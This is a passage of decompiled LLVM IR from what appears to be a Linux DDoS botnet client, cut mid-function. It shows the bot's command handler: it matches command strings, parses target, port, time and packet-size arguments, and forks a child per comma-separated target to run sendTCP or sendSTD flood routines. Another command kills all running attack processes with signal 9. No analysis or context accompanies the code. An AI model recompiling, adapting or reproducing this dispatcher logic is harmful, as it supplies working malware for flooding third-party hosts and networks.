  store i32 %v2_804c84e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056b1d.122 to i32), i32* @edi, align 4
  %v7_804c87d = call i32 @_strncmp(i8* %v4_804c86b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056b1d.122, i32 0, i32 0), i32 4)
  %v8_804c87d = urem i32 %v7_804c87d, 2
  %v9_804c87d = icmp eq i32 %v8_804c87d, 0
  %v0_804c87f = load i1, i1* %cf.global-to-local, align 1
  %v2_804c87f = or i1 %v0_804c87f, %v9_804c87d
  %v3_804c87f = zext i1 %v2_804c87f to i32
  %v4_804c87f = load i32, i32* %edx.global-to-local, align 4
  %v5_804c87f = and i32 %v4_804c87f, -256
  %v6_804c87f = or i32 %v3_804c87f, %v5_804c87f
  %v7_804c87f = xor i32 %v6_804c87f, 1
  store i32 %v7_804c87f, i32* @edx, align 4
  %v1_804c887 = trunc i32 %v7_804c87f to i8
  %v3_804c887 = zext i1 %v0_804c87f to i8
  %v15_804c887 = icmp eq i8 %v1_804c887, %v3_804c887
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c890 = icmp eq i1 %v15_804c887, false
  br i1 %v1_804c890, label %dec_label_pc_804cad9, label %dec_label_pc_804c896

dec_label_pc_804c896:                             ; preds = %dec_label_pc_804c84b
  %v9_804c896 = icmp ult i32 %arg1, 5
  store i1 %v9_804c896, i1* %cf.global-to-local, align 1
  %v7_804c89a = icmp sgt i32 %arg1, 5
  br i1 %v7_804c89a, label %dec_label_pc_804c8a0, label %dec_label_pc_804c928

dec_label_pc_804c8a0:                             ; preds = %dec_label_pc_804c896
  %v1_804c8a3 = add i32 %tmp119, 12
  %v5_804c8a3 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804c8a3, i1* %cf.global-to-local, align 1
  %v1_804c8a6 = inttoptr i32 %v1_804c8a3 to i32*
  %v2_804c8a6 = load i32, i32* %v1_804c8a6, align 4
  %v1_804c8ab = call i32 @atol(i32 %v2_804c8a6)
  %v5_804c8b0 = icmp ne i32 %v1_804c8ab, -1
  store i1 %v5_804c8b0, i1* %cf.global-to-local, align 1
  %v10_804c8b0 = icmp eq i32 %v1_804c8ab, -1
  br i1 %v10_804c8b0, label %dec_label_pc_804c928, label %dec_label_pc_804c8b5

dec_label_pc_804c8b5:                             ; preds = %dec_label_pc_804c8a0
  %v1_804c8b8 = add i32 %tmp119, 8
  %v5_804c8b8 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804c8b8, i1* %cf.global-to-local, align 1
  %v1_804c8bb = inttoptr i32 %v1_804c8b8 to i32*
  %v2_804c8bb = load i32, i32* %v1_804c8bb, align 4
  %v1_804c8c0 = call i32 @atol(i32 %v2_804c8bb)
  %v5_804c8c5 = icmp ne i32 %v1_804c8c0, -1
  store i1 %v5_804c8c5, i1* %cf.global-to-local, align 1
  %v10_804c8c5 = icmp eq i32 %v1_804c8c0, -1
  br i1 %v10_804c8c5, label %dec_label_pc_804c928, label %dec_label_pc_804c8ca

dec_label_pc_804c8ca:                             ; preds = %dec_label_pc_804c8b5
  %v1_804c8cd = add i32 %tmp119, 16
  %v2_804c8cd = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804c8cd, i1* %cf.global-to-local, align 1
  %v1_804c8d0 = inttoptr i32 %v1_804c8cd to i32*
  %v2_804c8d0 = load i32, i32* %v1_804c8d0, align 4
  %v1_804c8d5 = call i32 @atol(i32 %v2_804c8d0)
  %v5_804c8da = icmp ne i32 %v1_804c8d5, -1
  store i1 %v5_804c8da, i1* %cf.global-to-local, align 1
  %v10_804c8da = icmp eq i32 %v1_804c8d5, -1
  br i1 %v10_804c8da, label %dec_label_pc_804c928, label %dec_label_pc_804c8df

dec_label_pc_804c8df:                             ; preds = %dec_label_pc_804c8ca
  store i1 %v2_804c8cd, i1* %cf.global-to-local, align 1
  %v2_804c8e5 = load i32, i32* %v1_804c8d0, align 4
  %v1_804c8ea = call i32 @atol(i32 %v2_804c8e5)
  %v1_804c8ef = add i32 %v1_804c8ea, -32
  %v2_804c8ef = icmp ult i32 %v1_804c8ea, 32
  %v3_804c8ef = sub i32 31, %v1_804c8ea
  %v4_804c8ef = and i32 %v3_804c8ef, %v1_804c8ea
  %v5_804c8ef = icmp slt i32 %v4_804c8ef, 0
  store i1 %v2_804c8ef, i1* %cf.global-to-local, align 1
  %v6_804c8ef = icmp eq i32 %v1_804c8ef, 0
  %v7_804c8ef = icmp slt i32 %v1_804c8ef, 0
  %v3_804c8f2 = icmp eq i1 %v7_804c8ef, %v5_804c8ef
  %v4_804c8f2 = icmp eq i1 %v6_804c8ef, false
  %v5_804c8f2 = and i1 %v4_804c8f2, %v3_804c8f2
  br i1 %v5_804c8f2, label %dec_label_pc_804c928, label %dec_label_pc_804c8f4

dec_label_pc_804c8f4:                             ; preds = %dec_label_pc_804c8df
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c8f8 = icmp sgt i32 %arg1, 6
  br i1 %v7_804c8f8, label %dec_label_pc_804c8fa, label %dec_label_pc_804c90e

dec_label_pc_804c8fa:                             ; preds = %dec_label_pc_804c8f4
  %v1_804c8fd = add i32 %tmp119, 24
  %v5_804c8fd = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c8fd, i1* %cf.global-to-local, align 1
  %v1_804c900 = inttoptr i32 %v1_804c8fd to i32*
  %v2_804c900 = load i32, i32* %v1_804c900, align 4
  %v1_804c905 = call i32 @atol(i32 %v2_804c900)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804c90a = icmp slt i32 %v1_804c905, 0
  br i1 %v2_804c90a, label %dec_label_pc_804c928, label %dec_label_pc_804c90e

dec_label_pc_804c90e:                             ; preds = %dec_label_pc_804c8f4, %dec_label_pc_804c8fa
  %v8_804c90e = icmp ult i32 %arg1, 8
  store i1 %v8_804c90e, i1* %cf.global-to-local, align 1
  %v12_804c90e = icmp eq i32 %arg1, 8
  %v1_804c912 = icmp eq i1 %v12_804c90e, false
  br i1 %v1_804c912, label %dec_label_pc_804c942, label %dec_label_pc_804c914

dec_label_pc_804c914:                             ; preds = %dec_label_pc_804c90e
  %v1_804c917 = add i32 %tmp119, 28
  %v5_804c917 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c917, i1* %cf.global-to-local, align 1
  %v1_804c91a = inttoptr i32 %v1_804c917 to i32*
  %v2_804c91a = load i32, i32* %v1_804c91a, align 4
  %v1_804c91f = call i32 @atol(i32 %v2_804c91a)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp131 = icmp slt i32 %v1_804c91f, 1
  %tmp132 = icmp eq i1 %tmp131, false
  br i1 %tmp132, label %dec_label_pc_804c942, label %dec_label_pc_804c928

dec_label_pc_804c928:                             ; preds = %dec_label_pc_804c896, %dec_label_pc_804c914, %dec_label_pc_804c8fa, %dec_label_pc_804c8df, %dec_label_pc_804c8ca, %dec_label_pc_804c8b5, %dec_label_pc_804c8a0
  %v0_804c928 = load i32, i32* @global_var_805a6e0.18, align 32
  %v2_804c938 = call i32 @Rootsprintf(i32 %v0_804c928, i32 ptrtoint ([186 x i8]* @global_var_8056b24.123 to i32))
  br label %dec_label_pc_804cd5c

dec_label_pc_804c942:                             ; preds = %dec_label_pc_804c914, %dec_label_pc_804c90e
  %v1_804c945 = add i32 %tmp119, 4
  %v1_804c948 = inttoptr i32 %v1_804c945 to i32*
  %v2_804c948 = load i32, i32* %v1_804c948, align 4
  store i1 %v5_804c8b8, i1* %cf.global-to-local, align 1
  %v2_804c953 = load i32, i32* %v1_804c8bb, align 4
  %v1_804c958 = call i32 @atol(i32 %v2_804c953)
  store i1 %v5_804c8a3, i1* %cf.global-to-local, align 1
  %v2_804c966 = load i32, i32* %v1_804c8a6, align 4
  %v1_804c96b = call i32 @atol(i32 %v2_804c966)
  store i1 %v2_804c8cd, i1* %cf.global-to-local, align 1
  %v2_804c979 = load i32, i32* %v1_804c8d0, align 4
  %v1_804c97e = call i32 @atol(i32 %v2_804c979)
  %v1_804c989 = add i32 %tmp119, 20
  %v1_804c98c = inttoptr i32 %v1_804c989 to i32*
  %v2_804c98c = load i32, i32* %v1_804c98c, align 4
  store i1 %v8_804c90e, i1* %cf.global-to-local, align 1
  br i1 %v1_804c912, label %dec_label_pc_804c9b9, label %dec_label_pc_804c997

dec_label_pc_804c997:                             ; preds = %dec_label_pc_804c942
  %v1_804c99a = add i32 %tmp119, 28
  %v5_804c99a = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804c99a, i1* %cf.global-to-local, align 1
  %v1_804c99d = inttoptr i32 %v1_804c99a to i32*
  %v2_804c99d = load i32, i32* %v1_804c99d, align 4
  %v1_804c9a2 = call i32 @atol(i32 %v2_804c99d)
  br label %dec_label_pc_804c9b9

dec_label_pc_804c9b9:                             ; preds = %dec_label_pc_804c942, %dec_label_pc_804c997
  %storemerge5 = phi i32 [ %v1_804c9a2, %dec_label_pc_804c997 ], [ 10, %dec_label_pc_804c942 ]
  store i32 %storemerge5, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804c8f8, label %dec_label_pc_804c9c8, label %dec_label_pc_804c9ea

dec_label_pc_804c9c8:                             ; preds = %dec_label_pc_804c9b9
  %v1_804c9cb = add i32 %tmp119, 24
  %v5_804c9cb = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804c9cb, i1* %cf.global-to-local, align 1
  %v1_804c9ce = inttoptr i32 %v1_804c9cb to i32*
  %v2_804c9ce = load i32, i32* %v1_804c9ce, align 4
  %v1_804c9d3 = call i32 @atol(i32 %v2_804c9ce)
  br label %dec_label_pc_804c9ea

dec_label_pc_804c9ea:                             ; preds = %dec_label_pc_804c9b9, %dec_label_pc_804c9c8
  %storemerge4 = phi i32 [ %v1_804c9d3, %dec_label_pc_804c9c8 ], [ 0, %dec_label_pc_804c9b9 ]
  store i32 %storemerge4, i32* @edi, align 4
  %v2_804ca01 = inttoptr i32 %v2_804c948 to i8*
  %v3_804ca01 = call i32 @__GI_strchr(i8* %v2_804ca01, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ca06 = icmp eq i32 %v3_804ca01, 0
  br i1 %v1_804ca06, label %dec_label_pc_804ca8f, label %dec_label_pc_804ca0e

dec_label_pc_804ca0e:                             ; preds = %dec_label_pc_804c9ea
  store i32 %v2_804c948, i32* @eax, align 4
  %v2_804ca1c = call i32 @__GI_strtok(i32 %v2_804c948, i32 ptrtoint (i32* @global_var_8056a31.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ca8725 = icmp eq i32 %v2_804ca1c, 0
  %v1_804ca8b32 = icmp eq i1 %v4_804ca8725, false
  br i1 %v1_804ca8b32, label %dec_label_pc_804ca26, label %dec_label_pc_804cad9

dec_label_pc_804ca26:                             ; preds = %dec_label_pc_804ca0e, %dec_label_pc_804ca70
  %storemerge1033 = phi i32 [ %v2_804ca7f, %dec_label_pc_804ca70 ], [ %v2_804ca1c, %dec_label_pc_804ca0e ]
  %v0_804ca26 = call i32 @listFork()
  store i32 %v0_804ca26, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ca2b = icmp eq i32 %v0_804ca26, 0
  %v1_804ca2d = icmp eq i1 %v1_804ca2b, false
  br i1 %v1_804ca2d, label %dec_label_pc_804ca70, label %dec_label_pc_804ca2f

dec_label_pc_804ca2f:                             ; preds = %dec_label_pc_804ca26
  %v7_804ca5f = inttoptr i32 %v2_804c98c to i8*
  %v8_804ca5f = call i32 @sendTCP(i32 %storemerge1033, i32 %v1_804c958, i32 %v1_804c96b, i32 %v1_804c97e, i8* %v7_804ca5f, i32 %storemerge4, i32 %storemerge5)
  %v1_804ca6b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ca70:                             ; preds = %dec_label_pc_804ca26
  %v2_804ca7f = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8056a31.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ca87 = icmp eq i32 %v2_804ca7f, 0
  %v1_804ca8b = icmp eq i1 %v4_804ca87, false
  br i1 %v1_804ca8b, label %dec_label_pc_804ca26, label %dec_label_pc_804cad9

dec_label_pc_804ca8f:                             ; preds = %dec_label_pc_804c9ea
  %v0_804ca8f = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ca94 = icmp eq i32 %v0_804ca8f, 0
  %v1_804ca96 = icmp eq i1 %v1_804ca94, false
  br i1 %v1_804ca96, label %dec_label_pc_804cad9, label %dec_label_pc_804ca98

dec_label_pc_804ca98:                             ; preds = %dec_label_pc_804ca8f
  %v7_804cac8 = inttoptr i32 %v2_804c98c to i8*
  %v8_804cac8 = call i32 @sendTCP(i32 %v2_804c948, i32 %v1_804c958, i32 %v1_804c96b, i32 %v1_804c97e, i8* %v7_804cac8, i32 %storemerge4, i32 %storemerge5)
  %v1_804cad4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cad9:                             ; preds = %dec_label_pc_804ca70, %dec_label_pc_804ca0e, %dec_label_pc_804ca8f, %dec_label_pc_804c84b
  %v2_804cadc = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804caf9 = inttoptr i32 %v2_804cadc to i8*
  store i32 %v2_804cadc, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056bde.124 to i32), i32* @edi, align 4
  %v7_804cb0b = call i32 @_strncmp(i8* %v4_804caf9, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056bde.124, i32 0, i32 0), i32 4)
  %v8_804cb0b = urem i32 %v7_804cb0b, 2
  %v9_804cb0b = icmp eq i32 %v8_804cb0b, 0
  %v0_804cb0d = load i1, i1* %cf.global-to-local, align 1
  %v2_804cb0d = or i1 %v0_804cb0d, %v9_804cb0b
  %v3_804cb0d = zext i1 %v2_804cb0d to i32
  %v4_804cb0d = load i32, i32* @edx, align 4
  %v5_804cb0d = and i32 %v4_804cb0d, -256
  %v6_804cb0d = or i32 %v3_804cb0d, %v5_804cb0d
  %v7_804cb0d = xor i32 %v6_804cb0d, 1
  store i32 %v7_804cb0d, i32* @edx, align 4
  %v1_804cb15 = trunc i32 %v7_804cb0d to i8
  %v3_804cb15 = zext i1 %v0_804cb0d to i8
  %v15_804cb15 = icmp eq i8 %v1_804cb15, %v3_804cb15
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cb1e = icmp eq i1 %v15_804cb15, false
  br i1 %v1_804cb1e, label %dec_label_pc_804cc4b, label %dec_label_pc_804cb24

dec_label_pc_804cb24:                             ; preds = %dec_label_pc_804cad9
  %v9_804cb24 = icmp ult i32 %arg1, 3
  store i1 %v9_804cb24, i1* %cf.global-to-local, align 1
  %v7_804cb28 = icmp sgt i32 %arg1, 3
  br i1 %v7_804cb28, label %dec_label_pc_804cb2a, label %dec_label_pc_804cb52

dec_label_pc_804cb2a:                             ; preds = %dec_label_pc_804cb24
  %v1_804cb2d = add i32 %tmp119, 8
  %v5_804cb2d = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804cb2d, i1* %cf.global-to-local, align 1
  %v1_804cb30 = inttoptr i32 %v1_804cb2d to i32*
  %v2_804cb30 = load i32, i32* %v1_804cb30, align 4
  %v1_804cb35 = call i32 @atol(i32 %v2_804cb30)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp133 = icmp slt i32 %v1_804cb35, 1
  br i1 %tmp133, label %dec_label_pc_804cb52, label %dec_label_pc_804cb3e

dec_label_pc_804cb3e:                             ; preds = %dec_label_pc_804cb2a
  %v1_804cb41 = add i32 %tmp119, 12
  %v5_804cb41 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804cb41, i1* %cf.global-to-local, align 1
  %v1_804cb44 = inttoptr i32 %v1_804cb41 to i32*
  %v2_804cb44 = load i32, i32* %v1_804cb44, align 4
  %v1_804cb49 = call i32 @atol(i32 %v2_804cb44)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp134 = icmp slt i32 %v1_804cb49, 1
  %tmp135 = icmp eq i1 %tmp134, false
  br i1 %tmp135, label %dec_label_pc_804cb6c, label %dec_label_pc_804cb52

dec_label_pc_804cb52:                             ; preds = %dec_label_pc_804cb24, %dec_label_pc_804cb3e, %dec_label_pc_804cb2a
  %v0_804cb52 = load i32, i32* @global_var_805a6e0.18, align 32
  %v2_804cb62 = call i32 @Rootsprintf(i32 %v0_804cb52, i32 ptrtoint ([27 x i8]* @global_var_8056be2.125 to i32))
  br label %dec_label_pc_804cd5c

dec_label_pc_804cb6c:                             ; preds = %dec_label_pc_804cb3e
  %v1_804cb6f = add i32 %tmp119, 4
  %v1_804cb72 = inttoptr i32 %v1_804cb6f to i32*
  %v2_804cb72 = load i32, i32* %v1_804cb72, align 4
  store i1 %v5_804cb2d, i1* %cf.global-to-local, align 1
  %v2_804cb7d = load i32, i32* %v1_804cb30, align 4
  %v1_804cb82 = call i32 @atol(i32 %v2_804cb7d)
  store i1 %v5_804cb41, i1* %cf.global-to-local, align 1
  %v2_804cb90 = load i32, i32* %v1_804cb44, align 4
  %v1_804cb95 = call i32 @atol(i32 %v2_804cb90)
  %v2_804cbab = inttoptr i32 %v2_804cb72 to i8*
  %v3_804cbab = call i32 @__GI_strchr(i8* %v2_804cbab, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cbb0 = icmp eq i32 %v3_804cbab, 0
  br i1 %v1_804cbb0, label %dec_label_pc_804cc19, label %dec_label_pc_804cbb4

dec_label_pc_804cbb4:                             ; preds = %dec_label_pc_804cb6c
  store i32 %v2_804cb72, i32* @eax, align 4
  %v2_804cbc2 = call i32 @__GI_strtok(i32 %v2_804cb72, i32 ptrtoint (i32* @global_var_8056a31.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cc1116 = icmp eq i32 %v2_804cbc2, 0
  %v1_804cc1523 = icmp eq i1 %v4_804cc1116, false
  br i1 %v1_804cc1523, label %dec_label_pc_804cbcc, label %dec_label_pc_804cc4b

dec_label_pc_804cbcc:                             ; preds = %dec_label_pc_804cbb4, %dec_label_pc_804cbfa
  %storemerge1124 = phi i32 [ %v2_804cc09, %dec_label_pc_804cbfa ], [ %v2_804cbc2, %dec_label_pc_804cbb4 ]
  %v0_804cbcc = call i32 @listFork()
  store i32 %v0_804cbcc, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cbd1 = icmp eq i32 %v0_804cbcc, 0
  %v1_804cbd3 = icmp eq i1 %v1_804cbd1, false
  br i1 %v1_804cbd3, label %dec_label_pc_804cbfa, label %dec_label_pc_804cbd5

dec_label_pc_804cbd5:                             ; preds = %dec_label_pc_804cbcc
  %v3_804cbe9 = call i32 @sendSTD(i32 %storemerge1124, i32 %v1_804cb82, i32 %v1_804cb95)
  %v1_804cbf5 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cbfa:                             ; preds = %dec_label_pc_804cbcc
  %v2_804cc09 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8056a31.105 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cc11 = icmp eq i32 %v2_804cc09, 0
  %v1_804cc15 = icmp eq i1 %v4_804cc11, false
  br i1 %v1_804cc15, label %dec_label_pc_804cbcc, label %dec_label_pc_804cc4b

dec_label_pc_804cc19:                             ; preds = %dec_label_pc_804cb6c
  %v0_804cc19 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cc1e = icmp eq i32 %v0_804cc19, 0
  %v1_804cc20 = icmp eq i1 %v1_804cc1e, false
  br i1 %v1_804cc20, label %dec_label_pc_804cd5c, label %dec_label_pc_804cc26

dec_label_pc_804cc26:                             ; preds = %dec_label_pc_804cc19
  %v3_804cc3a = call i32 @sendSTD(i32 %v2_804cb72, i32 %v1_804cb82, i32 %v1_804cb95)
  %v1_804cc46 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cc4b:                             ; preds = %dec_label_pc_804cbfa, %dec_label_pc_804cbb4, %dec_label_pc_804cad9
  %v2_804cc4e = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804cc6b = inttoptr i32 %v2_804cc4e to i8*
  %v7_804cc7d = call i32 @_strncmp(i8* %v4_804cc6b, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056bfd.126, i32 0, i32 0), i32 5)
  %v8_804cc7d = urem i32 %v7_804cc7d, 2
  %v9_804cc7d = icmp eq i32 %v8_804cc7d, 0
  %v0_804cc7f = load i1, i1* %cf.global-to-local, align 1
  %v2_804cc7f = or i1 %v0_804cc7f, %v9_804cc7d
  %v3_804cc7f = zext i1 %v2_804cc7f to i32
  %v4_804cc7f = load i32, i32* @edx, align 4
  %v5_804cc7f = and i32 %v4_804cc7f, -256
  %v6_804cc7f = or i32 %v3_804cc7f, %v5_804cc7f
  %v7_804cc7f = xor i32 %v6_804cc7f, 1
  store i32 %v7_804cc7f, i32* %edx.global-to-local, align 4
  %v1_804cc87 = trunc i32 %v7_804cc7f to i8
  %v3_804cc87 = zext i1 %v0_804cc7f to i8
  %v4_804cc87 = sub nsw i8 %v1_804cc87, %v3_804cc87
  %v15_804cc87 = icmp eq i8 %v4_804cc87, 0
  %v2_804cc8b = sext i8 %v4_804cc87 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cc90 = icmp eq i1 %v15_804cc87, false
  br i1 %v1_804cc90, label %dec_label_pc_804cd5c, label %dec_label_pc_804ccff

dec_label_pc_804cca6:                             ; preds = %dec_label_pc_804cd3c, %dec_label_pc_804ccff
  %v2_804cca9 = mul i32 %storemerge1, 4
  %v9_804cca9 = and i32 %storemerge1, 1073741824
  %v10_804cca9 = icmp ne i32 %v9_804cca9, 0
  store i32 %v2_804cca9, i32* %edx.global-to-local, align 4
  %v0_804ccae = load i32, i32* @global_var_8060974.34, align 4
  %v2_804ccb3 = add i32 %v0_804ccae, %v2_804cca9
  %v1_804ccb6 = inttoptr i32 %v2_804ccb3 to i32*
  %v2_804ccb6 = load i32, i32* %v1_804ccb6, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ccb8 = icmp eq i32 %v2_804ccb6, 0
  br i1 %v1_804ccb8, label %dec_label_pc_804ccfc, label %dec_label_pc_804ccbc

dec_label_pc_804ccbc:                             ; preds = %dec_label_pc_804cca6
  store i1 %v10_804cca9, i1* %cf.global-to-local, align 1
  store i32 %v2_804cca9, i32* %edx.global-to-local, align 4
  %v2_804cccc = load i32, i32* %v1_804ccb6, align 4
  store i32 %v2_804cccc, i32* @ebx, align 4
  %v0_804ccce = call i32 @__libc_getpid()
  %v0_804ccd3 = load i32, i32* @ebx, align 4
  %v7_804ccd3 = icmp ult i32 %v0_804ccd3, %v0_804ccce
  store i1 %v7_804ccd3, i1* %cf.global-to-local, align 1
  %v12_804ccd3 = icmp eq i32 %v0_804ccd3, %v0_804ccce
  br i1 %v12_804ccd3, label %dec_label_pc_804ccfc, label %dec_label_pc_804ccd7

dec_label_pc_804ccd7:                             ; preds = %dec_label_pc_804ccbc
  store i1 %v10_804cca9, i1* %cf.global-to-local, align 1
  store i32 %v2_804cca9, i32* %edx.global-to-local, align 4
  %v0_804ccdf = load i32, i32* @global_var_8060974.34, align 4
  %v2_804cce4 = add i32 %v0_804ccdf, %v2_804cca9
  %v1_804cce7 = inttoptr i32 %v2_804cce4 to i32*
  %v2_804cce7 = load i32, i32* %v1_804cce7, align 4
  %v2_804ccf4 = call i32 @kill(i32 %v2_804cce7, i32 9)
  %v4_804ccf9 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804ccfc

dec_label_pc_804ccfc:                             ; preds = %dec_label_pc_804ccbc, %dec_label_pc_804cca6, %dec_label_pc_804ccd7
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804cca6 ], [ %stack_var_-28.1, %dec_label_pc_804ccbc ], [ %v4_804ccf9, %dec_label_pc_804ccd7 ]
  %v4_804ccfc = add i32 %storemerge1, 1
  br label %dec_label_pc_804ccff

dec_label_pc_804ccff:                             ; preds = %dec_label_pc_804cc4b, %dec_label_pc_804ccfc
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804ccfc ], [ 0, %dec_label_pc_804cc4b ]
  %storemerge1 = phi i32 [ %v4_804ccfc, %dec_label_pc_804ccfc ], [ 0, %dec_label_pc_804cc4b ]
  %v0_804cd13 = load i32, i32* @global_var_805a6e8.32, align 8
  %v0_804cd18 = load i32, i32* @global_var_805a6ec.33, align 4
  store i32 %v0_804cd18, i32* %edx.global-to-local, align 4
  %v10_804cd30 = icmp ne i32 %v0_804cd18, 0
  store i1 %v10_804cd30, i1* %cf.global-to-local, align 1
  br i1 %v10_804cd30, label %dec_label_pc_804cca6, label %dec_label_pc_804cd3c

dec_label_pc_804cd3c:                             ; preds = %dec_label_pc_804ccff
  %v10_804cd50 = icmp ult i32 %storemerge1, %v0_804cd13
  store i1 %v10_804cd50, i1* %cf.global-to-local, align 1
  br i1 %v10_804cd50, label %dec_label_pc_804cca6, label %dec_label_pc_804cd5c

dec_label_pc_804cd5c:                             ; preds = %dec_label_pc_804c7d4, %dec_label_pc_804cd3c, %dec_label_pc_804c76b, %dec_label_pc_804c441, %dec_label_pc_804c41f, %dec_label_pc_804cc4b, %dec_label_pc_804cc19, %dec_label_pc_804c7f6, %dec_label_pc_804c45a, %dec_label_pc_804c429, %dec_label_pc_804c376, %dec_label_pc_804c2eb, %dec_label_pc_804cb52, %dec_label_pc_804c928, %dec_label_pc_804c64c, %dec_label_pc_804c39f, %dec_label_pc_804c23c
  %v0_804cd66 = phi i32 [ %v1_804c44c, %dec_label_pc_804c441 ], [ %v2_804c414, %dec_label_pc_804c41f ], [ %v2_804cc8b, %dec_label_pc_804cc4b ], [ %v0_804cc19, %dec_label_pc_804cc19 ], [ %v0_804c7f6, %dec_label_pc_804c7f6 ], [ %v0_804c45a, %dec_label_pc_804c45a ], [ %v1_804c434, %dec_label_pc_804c429 ], [ %v0_804c376, %dec_label_pc_804c376 ], [ 0, %dec_label_pc_804c2eb ], [ %v2_804cb62, %dec_label_pc_804cb52 ], [ %v2_804c938, %dec_label_pc_804c928 ], [ %v2_804c65c, %dec_label_pc_804c64c ], [ %v1_804c383, %dec_label_pc_804c39f ], [ %v2_804c24c, %dec_label_pc_804c23c ], [ %v2_804c779, %dec_label_pc_804c76b ], [ %v0_804cd13, %dec_label_pc_804cd3c ], [ %v2_804c7e3, %dec_label_pc_804c7d4 ]
  %v0_804cd5c = load i32, i32* @esp, align 4
  %v5_804cd5c = icmp ugt i32 %v0_804cd5c, -301
  store i1 %v5_804cd5c, i1* %cf.global-to-local, align 1
  %v2_804cd62 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cd62, i32* @ebx, align 4
  store i32 %v0_804c1ed, i32* @esi, align 4
  store i32 %v0_804c1ec, i32* @edi, align 4
  ret i32 %v0_804cd66

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804cca9, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804cc7f, { 1, 0 }
  uselistorder i32 %v2_804cc09, { 1, 0 }
  uselistorder i32 %v1_804cb95, { 1, 0 }
  uselistorder i32 %v1_804cb82, { 1, 0 }
  uselistorder i32 %v2_804cb72, { 2, 1, 0, 3 }
  uselistorder i1 %v0_804cb0d, { 1, 0 }
  uselistorder i32 %v2_804ca7f, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0, 2 }
  uselistorder i32 %storemerge5, { 1, 0, 2 }
  uselistorder i32 %v2_804c98c, { 1, 0 }
  uselistorder i32 %v1_804c97e, { 1, 0 }
  uselistorder i32 %v1_804c96b, { 1, 0 }
  uselistorder i32 %v1_804c958, { 1, 0 }
  uselistorder i32 %v2_804c948, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c8ef, { 1, 0 }
  uselistorder i32 %v1_804c8ea, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804c87f, { 1, 0 }
  uselistorder i32 %v2_804c7e3, { 0, 2, 1 }
  uselistorder i32 %v2_804c779, { 1, 0, 2 }
  uselistorder i32 %storemerge7, { 1, 0, 2 }
  uselistorder i32 %storemerge8137, { 1, 0 }
  uselistorder i32 %v1_804c6ce, { 2, 1, 0 }
  uselistorder i32 %v1_804c6b5, { 1, 0 }
  uselistorder i32 %v1_804c6a2, { 1, 0 }
  uselistorder i32 %v1_804c68f, { 1, 0 }
  uselistorder i32 %v1_804c67c, { 1, 0 }
  uselistorder i32 %v2_804c66c, { 2, 1, 0, 3 }
  uselistorder i1 %v8_804c632, { 1, 0, 2 }
  uselistorder i32 %v1_804c62d, { 1, 0 }
  uselistorder i32 %v1_804c628, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804c616, { 1, 0 }
  uselistorder i32 %v1_804c611, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804c5ff, { 1, 0 }
  uselistorder i32 %v1_804c5fa, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804c572, { 1, 0 }
  uselistorder i32 %v1_804c4fa, { 1, 0 }
  uselistorder i1 %v0_804c408, { 1, 0 }
  uselistorder i1 %v0_804c363, { 1, 0 }
  uselistorder i1 %v0_804c2d8, { 1, 0 }
